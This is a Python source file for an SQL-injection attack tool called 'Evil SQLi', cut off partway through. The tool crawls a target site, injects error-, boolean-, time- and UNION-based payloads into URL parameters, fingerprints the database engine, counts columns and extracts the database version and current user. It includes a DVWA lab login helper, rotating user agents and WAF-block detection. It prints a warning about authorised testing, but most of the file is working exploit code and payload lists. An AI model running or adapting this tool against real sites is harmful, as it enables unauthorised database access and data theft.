#!/usr/bin/env python3
import os
import random
import string
import re
import json
import time
import difflib
import logging
import sys
import math
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup

# ===========================
# Banner and Safety Notice
# ===========================
def Symbol():
    print("\n")
    try:
        import pyfiglet
        text = "Evil SQLi"
        ascii_art = pyfiglet.figlet_format(text, font="graffiti", width=200, justify="left")
    except Exception:
        ascii_art = " Evil SQLi "

    warning1 = "[!] WARNING: This tool should only be used on systems you own or have explicit permission to test."
    warning2 = "[!] Unauthorized testing is illegal and unethical."

    colors_hex = [
        "#FF0000", "#FF4500", "#FF6347", "#FF1493", "#6A0DAD", "#8A2BE2",
        "#0ABDE3", "#00BFFF", "#00FF7F", "#00FFC6", "#00FF00", "#32CD32",
        "#3A0071", "#8B008B",
    ]

    def hex_to_rgb(h):
        h = h.lstrip("#")
        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))

    colors = [hex_to_rgb(c) for c in colors_hex]

    def lerp(c1, c2, t):
        return tuple(int(a + (b - a) * t) for a, b in zip(c1, c2))

    def get_cosmic_color(pos):
        if pos <= 0: return colors[0]
        if pos >= 1: return colors[-1]
        seg_len = 1 / (len(colors) - 1)
        idx = int(pos / seg_len)
        t = (pos - seg_len * idx) / seg_len
        return lerp(colors[idx], colors[idx + 1], t)

    visible_chars = [c for c in ascii_art if c not in [" ", "\n"]]
    total_visible = max(1, len(visible_chars))

    def rgb_escape(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"

    output, char_index = "", 0
    for ch in ascii_art:
        if ch == "\n":
            output += "\n"
        elif ch == " ":
            output += " "
        else:
            pos = char_index / total_visible
            r, g, b = get_cosmic_color(pos)
            output += rgb_escape(r, g, b) + ch
            char_index += 1
    output += "\033[0m"
    print(output)

    red_color = "\033[38;2;255;0;0m"
    reset_color = "\033[0m"
    print(f"{red_color}{warning1}{reset_color}")
    print(f"{red_color}{warning2}{reset_color}")
    print("\033[0m")


# ===========================
# Config and Colors
# ===========================
@dataclass
class Config:
    timeout: int = 10
    delay: float = 0.5
    max_depth: int = 2
    union_max_cols: int = 20
    time_based_threshold: float = 4.0
    similarity_threshold: float = 0.92
    use_cookies: bool = True

class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD_GREEN = "\033[1;92m"
    CYAN = "\033[96m"
    RESET = "\033[0m"


# ===========================
# Debug Utilities
# ===========================
DEBUG = False

def info(msg: str) -> None:
    print(f"{Colors.GREEN}[*] {msg}{Colors.RESET}")

def warn(msg: str) -> None:
    print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")

def error(msg: str) -> None:
    print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

def good(msg: str) -> None:
    print(f"{Colors.BOLD_GREEN}[+] {msg}{Colors.RESET}")

def diag(msg: str) -> None:
    print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")

def debug(msg: str) -> None:
    if DEBUG:
        print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} {msg}")


# ===========================
# Helpers
# ===========================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def domain_folder(target_url: str) -> str:
    domain = urlparse(target_url).netloc or target_url.replace("://", "_")
    folder = os.path.join(SCRIPT_DIR, domain)
    os.makedirs(folder, exist_ok=True)
    return folder

def save_text(folder: str, name: str, lines: List[str]) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        for ln in lines:
            f.write(ln + "\n")
    info(f"Saved: {path}")

def save_json(folder: str, name: str, obj: dict) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {path}")

def same_domain(a: str, b: str) -> bool:
    return urlparse(a).netloc == urlparse(b).netloc

def normalize_url(u: str) -> str:
    pr = urlparse(u)
    qs = parse_qs(pr.query, keep_blank_values=True)
    sorted_qs = urlencode({k: v[0] if v else "" for k, v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sorted_qs, ""))


# ===========================
# HTTP Client
# ===========================
USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

class HttpClient:
    def __init__(self, timeout: int = 10, delay: float = 0.5, use_cookies: bool = True):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.use_cookies = use_cookies
        if not use_cookies:
            self.session.cookies.clear()
            
    def login_dvwa(self, base_url: str, username="admin", password="password", security="low") -> bool:
        login_url = f"{base_url.rstrip('/')}/login.php"
        security_url = f"{base_url.rstrip('/')}/security.php"
        
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })

        try:
            resp = self.session.get(login_url, timeout=self.timeout)
            debug(f"Login page status: {resp.status_code}")
            token_match = re.search(r"name='user_token' value='([^']+)'", resp.text)
            user_token = token_match.group(1) if token_match else ""
            debug(f"CSRF token found: {bool(token_match)}")
        except Exception as e:
            error(f"Could not fetch DVWA login page: {e}")
            return False

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token
        }
        try:
            resp = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=True)
            debug(f"Login response URL: {resp.url}")
            debug(f"Login response status: {resp.status_code}")
            
            if "login.php" in resp.url.lower():
                warn("DVWA login failed — check credentials or CSRF token")
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.IGNORECASE)
                if error_match:
                    warn(f"Login error: {error_match.group(1)}")
                return False
        except Exception as e:
            error(f"DVWA login request failed: {e}")
            return False

        try:
            sec_resp = self.session.get(security_url, timeout=self.timeout)
            token_match = re.search(r"name='user_token' value='([^']+)'", sec_resp.text)
            user_token = token_match.group(1) if token_match else ""
            
            data = {"security": security, "seclev_submit": "Submit", "user_token": user_token}
            self.session.post(security_url, data=data, timeout=self.timeout, allow_redirects=True)
            good(f"DVWA login successful, security set to '{security}'")
            return True
        except Exception as e:
            error(f"Could not set DVWA security: {e}")
            return False


    def get(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.delay)
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        debug(f"HTTP GET -> {url}")
        debug(f"Headers: {headers}")
        try:
            response = self.session.get(
                url, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            debug(f"Status: {response.status_code} | len(body)= {len(response.text)} | content-type= {response.headers.get('Content-Type')}")
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            if e.response is not None and e.response.status_code == 403:
                warn(f"Access denied (403) for {url} — try adjusting headers or cookies")
            else:
                error(f"HTTP Error: {e} for {url}")
        except requests.exceptions.Timeout:
            error(f"Timeout occurred for {url}")
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {url} ({e})")
        return None


# ===========================
# Crawling
# ===========================
@dataclass
class CrawlResult:
    url: str
    params: List[str] = field(default_factory=list)

class Crawler:
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url = base_url.rstrip("/")
        self.depth = max(1, depth)
        self.client = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}

    def run(self) -> List[CrawlResult]:
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        results: List[CrawlResult] = []
        for u, params in self.endpoints.items():
            results.append(CrawlResult(u, sorted(list(params))))
        debug(f"Crawl discovered {len(results)} endpoints with params")
        return results

    def _crawl(self, url: str, depth: int) -> None:
        url = normalize_url(url)
        if depth <= 0 or url in self.visited:
            debug(f"Skipping (visited/depth): {url} (depth= {depth})")
            return
        self.visited.add(url)

        resp = self.client.get(url)
        if not resp or "text/html" not in (resp.headers.get("Content-Type") or ""):
            debug(f"Non-HTML or no response: {url}")
            return

        soup = BeautifulSoup(resp.text, "html.parser")

        pr = urlparse(url)
        if pr.query:
            params = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(params)
            info(f"Found endpoint: {url} -> {params}")

        for a in soup.find_all("a", href=True):
            href = a["href"]
            nxt = urljoin(url, href)
            if not same_domain(nxt, self.base_url):
                continue
            link_pr = urlparse(nxt)
            if link_pr.query:
                link_params = list(parse_qs(link_pr.query, keep_blank_values=True).keys())
                self.endpoints.setdefault(nxt, set()).update(link_params)
                info(f"Found link endpoint: {nxt} -> {link_params}")
            self._crawl(nxt, depth - 1)


# ===========================
# Signatures and Payloads
# ===========================
DBMS_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
        "mysql_num_rows", "mysqli", "for the right syntax to use",
    ],
    "PostgreSQL": ["pg_query", "pg_connect", "postgresql", "psql:"],
    "MSSQL": [
        "microsoft odbc", "sql server", "oledbexception", "mssql",
        "unclosed quotation mark after the character string",
    ],
    "Oracle": ["ora-", "oracle error", "quoted string not properly terminated"],
    "SQLite": ["sqlite error", "sql logic error", "sqlite3"],
}

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax","warning: mysql",
    "mysql_fetch","mysql_num_rows",
    "mysqli","for the right syntax to use",
    "pg_query","pg_connect",
    "postgresql","psql:",
    "microsoft odbc","sql server",
    "oledbexception","mssql",
    "unclosed quotation mark after the character string","ora-",
    "oracle error","quoted string not properly terminated",
    "sqlite error","sql logic error",
    "sqlite3","syntax error",
    "unexpected token","unknown column",
    "table.*doesn't exist","division by zero",
    "violation of.*constraint","conversion failed",
    "incorrect syntax","invalid parameter",
    "argument type","cannot be cast",
    "must be of type","invalid input syntax",
    "type mismatch","wrong number of arguments",
]

BUILTIN_PAYLOADS = [
    "'","''","`",
    "``","\"",
    "\"\"","' OR '1'='1",
    "' OR '1'='1' --","' OR '1'='1' /*",
    "' OR 1=1--","' OR 1=1#",
    "' OR 1=1/*","') OR ('1'='1--",
    "' OR 'a'='a","' OR 'a'='a'--",
    "' OR 'a'='a'/*","\" OR \"\"=\"",
    "\" OR 1=1--","\" OR 1=1#",
    "\" OR 1=1/*","') OR ('1'='1--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--","' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--","' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
    "' WAITFOR DELAY '0:0:5'--","' WAITFOR DELAY '0:0:5'#",
    "' WAITFOR DELAY '0:0:5'/*","'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'#","'; WAITFOR DELAY '0:0:5'/*",
    "' AND SLEEP(5)--","' AND SLEEP(5)#",
    "' AND SLEEP(5)/*","' OR SLEEP(5)--",
    "' OR SLEEP(5)#","' OR SLEEP(5)/*",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'--","' AND (SELECT SUBSTRING(@@version,1,1))='X'#",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'/*","' OR (SELECT SUBSTRING(@@version,1,1))='X'--",
    "' OR (SELECT SUBSTRING(@@version,1,1))='X'#","' OR (SELECT SUBSTRING(@@version,1,1))='X'/*",
]

DBMS_SPECIFIC_PAYLOADS = {
    "MySQL": {
        "error_based": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -",
                        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "time_based": ["' AND SLEEP(5)-- -",
                       "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "boolean_based": ["' OR 1=1-- -", "' OR 'a'='a'"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "PostgreSQL": {
        "error_based": ["' AND CAST((SELECT version()) AS INTEGER)-- -",
                        "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"],
        "time_based": ["' AND (SELECT pg_sleep(5))-- -",
                       "' AND 123=(SELECT 123 FROM pg_sleep(5))-- -"],
        "boolean_based": ["' OR '1'='1'-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "MSSQL": {
        "error_based": ["' AND 1=CONVERT(INT,(SELECT @@version))-- -",
                        "' AND 1=@@version-- -"],
        "time_based": ["' WAITFOR DELAY '0:0:5'-- -",
                       "' IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5'-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Oracle": {
        "error_based": ["' AND (SELECT * FROM (SELECT CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance)) FROM dual)) IS NOT NULL-- -"],
        "time_based": ["' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0)>0-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL FROM dual-- -"]
    },
    "SQLite": {
        "error_based": ["' AND load_extension('nonexistent')-- -"],
        "time_based": ["' AND (SELECT randomblob(1000000000))-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Generic": {
        "error_based": ["'", "''", "`", "``", "\"", "\"\""],
        "time_based": ["' AND 1=0-- -", "' OR IF(1=1,SLEEP(5),0)-- -"],
        "boolean_based": ["' OR '1'='1'", "' OR '1'='0'", "OR 1=1", "OR 1=0"],
        "union_based": ["' UNION SELECT NULL-- -", "' UNION ALL SELECT NULL-- -"]
    }
}

def detect_dbms(html_lower: str) -> Optional[str]:
    for db, sigs in DBMS_SIGNATURES.items():
        for s in sigs:
            if s in html_lower:
                return db
    return None

def apply_payload_to_url(url: str, param: str, payload: str, append: bool = True) -> str:
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        if append:
            cur = qs[param][0] if qs[param] else ""
            qs[param] = [cur + payload]
        else:
            qs[param] = [payload]
    new_query = urlencode({k: v[0] if v else "" for k, v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, new_query, ""))


# ===========================
# Findings
# ===========================
@dataclass
class Finding:
    url: str
    param: str
    technique: str
    payload: str
    dbms: Optional[str] = None
    severity: str = "Unknown"
    confidence: float = 0.0
    columns: Optional[int] = None
    version: Optional[str] = None
    current_user: Optional[str] = None

    def to_dict(self):
        return {
            "url": self.url, "param": self.param, "technique": self.technique,
            "payload": self.payload, "dbms": self.dbms, "severity": self.severity,
            "confidence": self.confidence, "columns": self.columns,
            "version": self.version, "current_user": self.current_user,
        }


# ===========================
# Scanner
# ===========================
class Scanner:
    def __init__(self, client: Optional[HttpClient] = None):
        self.client = client or HttpClient(timeout=10)
        self.findings: List[Finding] = []
        self.enumerated: Set[Tuple[str, str]] = set()

    def _calculate_severity(self, technique: str, dbms: Optional[str] = None) -> str:
        severity_map = {
            "Union-Based": "High",
            "Error-Based": "High",
            "Time-Based": "Medium",
            "Boolean-Based": "Medium",
        }
        severity = severity_map.get(technique, "High")
        if dbms in ["Oracle", "MSSQL"] and severity == "High":
            severity = "Critical"
        elif dbms in ["MySQL", "PostgreSQL"] and severity == "High":
            severity = "High"
        return severity

    def _calculate_confidence(self, technique: str) -> float:
        confidence_map = {
            "Union-Based": 0.95, "Error-Based": 0.90,
            "Time-Based": 0.85, "Boolean-Based": 0.80,
        }
        return confidence_map.get(technique, 0.75)

    def fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        debug(f"Fingerprinting DBMS for {url} param= {param}")
        fingerprint_payloads = {
            "MySQL": [
                ("' AND SLEEP(5)-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT 'test' RLIKE '^t')-- -", "function"),
            ],
            "PostgreSQL": [
                ("' AND (SELECT pg_sleep(5))-- -", "time"),
                ("' AND (SELECT version())-- -", "function"),
                ("' AND (SELECT 'test' ~ '^t')-- -", "function"),
            ],
            "MSSQL": [
                ("'; WAITFOR DELAY '0:0:5'-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT CHAR(65))-- -", "function"),
            ],
            "Oracle": [
                ("' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)-- -", "time"),
                ("' AND (SELECT banner FROM v$version WHERE rownum=1)-- -", "function"),
                ("' AND (SELECT CHR(65) FROM DUAL)-- -", "function"),
            ],
            "SQLite": [
                ("' AND (SELECT randomblob(1000000000))-- -", "time"),
                ("' AND (SELECT sqlite_version())-- -", "function"),
                ("' AND (SELECT hex('A'))-- -", "function"),
            ]
        }

        baseline_time = self._avg_elapsed(url, n=2)
        debug(f"Baseline avg elapsed: {baseline_time:.3f}s")

        for dbms, payloads in fingerprint_payloads.items():
            for payload, technique in payloads:
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"[FP] DBMS= {dbms} technique= {technique} payload= {payload}")
                if technique == "time":
                    start = time.time()
                    resp = self.client.get(test_url)
                    elapsed = time.time() - start
                    debug(f"[FP] Response {'OK' if resp else 'None'} elapsed= {elapsed:.3f}s")
                    if resp and elapsed >= 4.0:
                        return dbms
                else:
                    resp = self.client.get(test_url)
                    debug(f"[FP] Resp status= {'OK' if resp else 'None'}")
                    if resp and resp.status_code < 500:
                        return dbms
        return None

    def _is_blocked(self, html: str) -> bool:
        BLOCK_INDICATORS = [
            "Cloudflare", "Incapsula", "Akamai", "Imperva", "Barracuda",
            "ModSecurity", "WebKnight", "Sucuri", "SiteLock", "Comodo",
            "403 Forbidden", "Access Denied", "Security Blocked",
            "Your request has been blocked", "Web Application Firewall",
            "Request rejected", "Security violation"
        ]
        
        DVWA_NORMAL_CONTENT = [
            "login", "csrf", "token", "dvwa", "security", "captcha",
            "phpids", "help", "about", "instructions", "setup", "logout"
        ]
        
        if not html:
            return False
            
        html_lower = html.lower()
        
        block_detected = any(indicator.lower() in html_lower for indicator in BLOCK_INDICATORS)
        
        dvwa_content = any(indicator in html_lower for indicator in DVWA_NORMAL_CONTENT)
        
        if block_detected and not dvwa_content:
            debug("WAF/CAPTCHA/Block indicator detected")
            return True
        
        return False

    def _avg_elapsed(self, url: str, n: int = 2) -> float:
        times = []
        for _ in range(n):
            t0 = time.time()
            _ = self.client.get(url)
            times.append(time.time() - t0)
            time.sleep(0.2)
        avg = sum(times) / len(times) if times else 0.0
        debug(f"Avg elapsed over {n} tries: {avg:.3f}s")
        return avg

    def check_error_based(self, base_html: str, test_html: str) -> Tuple[bool, Optional[str]]:
        test_lower = (test_html or "").lower()
        for e in SQL_ERROR_PATTERNS:
            if e.lower() in test_lower:
                return True, detect_dbms(test_lower)
        db = detect_dbms(test_lower)
        return (db is not None), db

    def check_boolean_based_similarity(self, true_html: str, false_html: str, threshold: float = 0.92) -> bool:
        if not (true_html and false_html):
            return False
        a = re.sub(r"\s+", " ", true_html)
        b = re.sub(r"\s+", " ", false_html)
        ratio = self._similarity_ratio(a, b)
        debug(f"Boolean-based similarity ratio= {ratio:.3f} (threshold= {threshold})")
        return ratio < threshold

    def check_time_based(self, elapsed_sec: float, threshold: float = 4.0) -> bool:
        debug(f"Time-based check elapsed= {elapsed_sec:.3f}s threshold= {threshold}")
        return elapsed_sec >= threshold

    def _similarity_ratio(self, a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _rand_token(self, n=8) -> str:
        return "X" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n)) + "X"

    def _calculate_average(self, ratios: List[float]) -> float:
        return sum(ratios) / len(ratios) if ratios else 0.0

    def _calculate_stdev(self, ratios: List[float]) -> float:
        if len(ratios) < 2:
            return 0.0
        avg = self._calculate_average(ratios)
        variance = sum((x - avg) ** 2 for x in ratios) / (len(ratios) - 1)
        return math.sqrt(variance)

    def _determine_column_count(self, url: str, param: str, is_numeric: bool, max_cols: int = 20) -> Optional[int]:
        debug(f"Determining column count for {url} param= {param} up to {max_cols}")
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            return None
        
        baseline_html = baseline_resp.text
        
        debug("Trying ORDER BY method for column count detection")
        for cols in range(1, max_cols + 1):
            if is_numeric:
                order_payload = f" ORDER BY {cols}-- -"
            else:
                order_payload = f"' ORDER BY {cols}-- -"
                
            test_url = apply_payload_to_url(url, param, order_payload, append=True)
            debug(f"ORDER BY test cols= {cols} payload= {order_payload}")
            resp = self.client.get(test_url)
            
            if not resp:
                debug(f"No response for ORDER BY {cols}")
                continue
                
            resp_text = resp.text
            resp_text_lower = resp_text.lower()
            
            column_count_errors = [
                "unknown column", "unknown order by column", "invalid column number",
                "order by position", "invalid column", "column index out of range",
                "invalid ordinal", "order by number", "column.*not found",
                "the order by position number.*is out of range", "order by clause.*out of range",
                "unknown column.*in.*order clause", "invalid column name"
            ]
            
            has_column_error = any(re.search(error, resp_text_lower, re.IGNORECASE) for error in column_count_errors)
            
            generic_errors = [
                "sql syntax", "syntax error", "mysql server", "postgresql query",
                "oracle error", "microsoft.*odbc", "odbc.*driver", "sqlserver",
                "pdoexception", "query failed", "database error"
            ]
            
            has_generic_error = any(re.search(error, resp_text_lower, re.IGNORECASE) for error in generic_errors)
            
            similarity = self._similarity_ratio(baseline_html, resp_text)
            
            content_difference = abs(len(baseline_html) - len(resp_text)) > len(baseline_html) * 0.3
            
            if has_column_error or (has_generic_error and similarity < 0.7) or (similarity < 0.6 and content_difference):
                debug(f"Column count error/difference detected at ORDER BY {cols}, assuming column count = {cols-1}")
                return cols - 1
        
        debug("ORDER BY method inconclusive, trying UNION SELECT method with statistical analysis")
        
        items = []
        ratios = []
        pages = {}
        
        for count in range(1, max_cols + 1):
            if is_numeric:
                union_payload = f"-1 UNION SELECT {','.join(['NULL'] * count)}-- -"
            else:
                union_payload = f"' UNION SELECT {','.join(['NULL'] * count)}-- -"
                
            test_url = apply_payload_to_url(url, param, union_payload, append=True)
            debug(f"UNION SELECT test cols= {count} payload= {union_payload}")
            resp = self.client.get(test_url)
            
            if resp:
                ratio = self._similarity_ratio(baseline_html, resp.text)
                items.append((count, ratio))
                ratios.append(ratio)
                pages[count] = resp.text
                debug(f"Column count {count} - similarity ratio: {ratio:.3f}")
        
        if not items:
            warn("No responses received for UNION SELECT tests")
            return None
            
        best_match = max(items, key=lambda x: x[1])
        debug(f"Best match: {best_match[0]} columns with similarity {best_match[1]:.3f}")
        
        if best_match[1] > 0.8:
            return best_match[0]
        
        debug("Looking for significant drops in similarity ratio")
        
        for i in range(1, len(items)):
            current_ratio = items[i][1]
            prev_ratio = items[i-1][1]
            
            if prev_ratio - current_ratio > 0.2:
                debug(f"Significant drop at {items[i][0]} columns ({prev_ratio:.3f} -> {current_ratio:.3f}), assuming {items[i-1][0]} columns")
                return items[i-1][0]
        
        debug("Statistical analysis inconclusive, trying token-based detection")
        for cols in range(1, max_cols + 1):
            for pos in range(cols):
                vals = ["NULL"] * cols
                token = self._rand_token(6)
                vals[pos] = f"'{token}'"
                
                if is_numeric:
                    payload = f"-1 UNION SELECT {','.join(vals)}-- -"
                else:
                    payload = f"' UNION SELECT {','.join(vals)}-- -"
                    
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"Try cols= {cols} pos= {pos} payload= {payload}")
                resp = self.client.get(test_url)
                
                if resp:
                    if token in resp.text:
                        good(f"Column count confirmed via UNION-based injection: {cols}")
                        return cols
                    
                    error_detected, _ = self.check_error_based(baseline_html, resp.text)
                    if error_detected and ("union" in resp.text.lower() or "column" in resp.text.lower()):
                        debug(f"Union column count error detected at {cols} columns")
                        continue
        
        warn(f"Could not determine column count up to {max_cols} columns for parameter '{param}'")
        return None

    def _try_union_probe(self, url: str, param: str, is_numeric: bool, dbms: Optional[str] = None) -> Optional[Finding]:
        cols = self._determine_column_count(url, param, is_numeric, max_cols=20)
        if not cols:
            debug("Union probe aborted: no column count")
            return None

        good(f"Union-Based SQLi possible with {cols} columns on parameter '{param}'")

        token = self._rand_token(10)
        vals = ["NULL"] * cols

        for pos in range(cols):
            test_vals = vals.copy()
            test_vals[pos] = f"'{token}'"

            if is_numeric:
                payload = f"-1 UNION SELECT {','.join(test_vals)}-- -"
            else:
                payload = f"' UNION SELECT {','.join(test_vals)}-- -"
                
            test_url = apply_payload_to_url(url, param, payload, append=True)
            debug(f"Union probe position {pos} payload= {payload}")
            resp = self.client.get(test_url)

            if resp and token in resp.text:
                good(f"Confirmed Union-Based SQLi on {param} (cols= {cols}, visible position= {pos})")
                severity = self._calculate_severity("Union-Based", dbms)
                confidence = self._calculate_confidence("Union-Based")
                return Finding(url, param, "Union-Based", payload, dbms, severity, confidence, columns=cols)

        warn(f"Union-based SQLi not confirmed for '{param}' despite detecting {cols} columns")
        return None

    def scan_param(self, url: str, param: str, folder: str) -> Optional[Finding]:
        info(f"Scanning parameter: {param}")
        
        if "dvwa" in url.lower() and param.lower() == "submit":
            debug(f"Skipping Submit parameter in DVWA")
            return None
        
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            debug("Baseline request failed")
            return None
        baseline_html = baseline_resp.text
        
        if "dvwa" in url.lower() and "login" in baseline_html.lower():
            warn("DVWA session may have expired - re-login needed")
            return None

        dbms = detect_dbms(baseline_html.lower()) if baseline_html else None
        if not dbms:
            fp = self.fingerprint_dbms(url, param)
            if fp:
                dbms = fp
                info(f"Fingerprinted DBMS: {dbms}")
            else:
                debug("DBMS fingerprinting inconclusive early")

        if self._is_blocked(baseline_html):
            warn(f"Request blocked (WAF/CAPTCHA) for {url}")
            return None

        payloads = BUILTIN_PAYLOADS
        selected_payloads = []
        if dbms and dbms in DBMS_SPECIFIC_PAYLOADS:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["union_based"])
        else:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["union_based"])

        selected_payloads.extend(payloads)

        try:
            pr = urlparse(url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            orig_val = (qs.get(param, [""])[0]).strip()
            numeric_like = re.fullmatch(r"-?\d+", orig_val) is not None
            debug(f"Original value for '{param}' = '{orig_val}' | numeric_like= {numeric_like}")
        except Exception as ex:
            debug(f"numeric_like detection failed: {ex}")
            numeric_like = False

        true_payload = " OR 1=1-- "
        false_payload = " AND 1=2-- "
        true_url = apply_payload_to_url(url, param, true_payload, append=True)
        false_url = apply_payload_to_url(url, param, false_payload, append=True)
        debug(f"Boolean test urls: TRUE={true_url} FALSE={false_url}")
        true_resp = self.client.get(true_url)
        false_resp = self.client.get(false_url)
        if true_resp and false_resp and self.check_boolean_based_similarity(true_resp.text, false_resp.text, threshold=self.config_sim_threshold() if hasattr(self, 'config_sim_threshold') else 0.92):
            good(f"Confirmed Boolean-Based SQLi on {param}")
            severity = self._calculate_severity("Boolean-Based", dbms)
            confidence = self._calculate_confidence("Boolean-Based")
            finding = Finding(url, param, "Boolean-Based", true_payload, dbms, severity, confidence)
            cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
            if cols:
                finding.columns = cols
                good(f"Determined column count = {cols} for parameter '{param}' (ORDER BY primary)")
                exploiter = Exploiter(self.client, url, param, dbms, cols)
                finding.version = exploiter.get_version()
                finding.current_user = exploiter.get_current_user()
                if finding.version: good(f"Extracted DB Version: {finding.version}")
                if finding.current_user: good(f"Extracted Current User: {finding.current_user}")
            return finding

        baseline_avg = self._avg_elapsed(url, n=2)
        time_based_templates = {
            "MySQL": "' AND SLEEP({delay})-- -",
            "PostgreSQL": "' AND (SELECT pg_sleep({delay}))-- -",
            "MSSQL": "'; WAITFOR DELAY '0:0:{delay}'-- -",
            "Oracle": "' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=0)>0-- -",
